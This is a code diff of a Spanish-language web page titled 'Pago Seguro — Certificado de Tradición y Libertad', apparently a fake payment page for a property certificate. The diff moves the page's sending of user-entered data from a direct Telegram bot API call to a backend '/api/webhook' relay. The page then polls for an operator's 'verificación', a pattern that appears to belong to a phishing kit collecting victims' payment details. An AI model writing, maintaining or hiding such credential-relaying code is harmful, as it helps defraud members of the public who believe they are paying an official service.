@@ -5,12 +5,6 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Pago Seguro — Certificado de Tradición y Libertad</title>
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Pago Seguro — Certificado de Tradición y Libertad</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
         :root {
@@ -1036,10 +1030,6 @@
         // ============================================
         // CONFIGURACIÓN DE TELEGRAM Y WEBHOOK
         // ============================================
-        
-        // ✅ SIN CREDENCIALES EN FRONTEND
-        // El frontend SOLO envía datos a /api/webhook
-        // El backend (webhook.js) tiene las credenciales
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -1527,7 +1517,7 @@
                 mensaje += `📅 Fecha: ${datos.fechaHora}\n\n`;
                 mensaje += `⏳ *Estado:* Esperando verificación...`;
 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const url = `/api/webhook`;
 
                 const response = await fetch(url, {
                     method: 'POST',
